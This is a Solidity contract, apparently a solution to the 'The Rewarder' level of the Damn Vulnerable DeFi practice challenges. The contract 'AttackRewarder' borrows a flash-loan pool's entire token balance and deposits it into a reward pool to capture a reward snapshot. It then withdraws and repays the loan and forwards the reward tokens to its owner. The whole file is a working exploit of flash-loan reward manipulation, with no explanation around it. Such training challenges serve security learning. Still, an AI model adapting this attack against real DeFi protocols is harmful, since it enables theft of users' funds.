// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/utils/FixedPointMathLib.sol";
import "solady/src/utils/SafeTransferLib.sol";
import { RewardToken } from "./RewardToken.sol";
import { AccountingToken } from "./AccountingToken.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import{TheRewarderPool} from "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
contract AttackRewarder{

    FlashLoanerPool public flashLoaner;
    TheRewarderPool public rewardPool;
    DamnValuableToken public  liquidityToken;
    RewardToken public rewardToken;
    address public owner;
    address public player=0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc;
    uint256 public constant ETHER_AMOUNT=100 ether;
    uint256 dvtPoolBalance;
    constructor(address _rewardPool,address _flashLoaner,address _lToken,address _rewardToken){
    owner=msg.sender;
    flashLoaner= FlashLoanerPool(_flashLoaner);
    rewardPool=TheRewarderPool(_rewardPool);
    liquidityToken=DamnValuableToken(_lToken);
    rewardToken=RewardToken(_rewardToken);
    }

    function receiveFlashLoan(uint256 _amount) external{ 
      liquidityToken.approve(address(rewardPool),_amount);
      rewardPool.deposit(_amount);
      rewardPool.withdraw(_amount);
      liquidityToken.transfer(address(flashLoaner),_amount);
      uint256 reward=rewardToken.balanceOf(address(this));
      rewardToken.transfer(owner,reward);
    }

    function attack()external{
        dvtPoolBalance = liquidityToken.balanceOf(address(flashLoaner));
        flashLoaner.flashLoan(dvtPoolBalance);
        
    }
}